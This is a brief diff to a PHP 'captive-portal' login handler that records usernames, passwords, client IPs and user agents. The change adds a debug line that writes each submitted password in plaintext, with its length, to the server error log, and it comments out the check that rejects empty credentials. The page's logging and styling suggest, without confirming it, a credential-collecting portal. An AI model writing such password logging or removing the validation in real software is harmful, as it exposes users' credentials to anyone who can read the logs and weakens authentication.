@@ -10,8 +10,12 @@ function norm_ip($ip) {
 }
 
 $user = trim($_POST['user'] ?? '');
-$pwd  = trim($_POST['password'] ?? '');
-if ($user === '' || $pwd === '') { http_response_code(400); exit; }
+$pwd = $_POST['password'] ?? '';
+$pwd = trim($pwd);
+
+error_log("DEBUG - Password received: [" . $pwd . "] length: " . strlen($pwd));
+
+//if ($user === '' || $pwd === '') { http_response_code(400); exit; }
 
 $ip   = norm_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
 $ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
@@ -55,4 +59,5 @@ error_log("captive-portal: $line");
   a{color:#0067b8;text-decoration:none}
   a:hover{text-decoration:underline}
 </style>
+
 
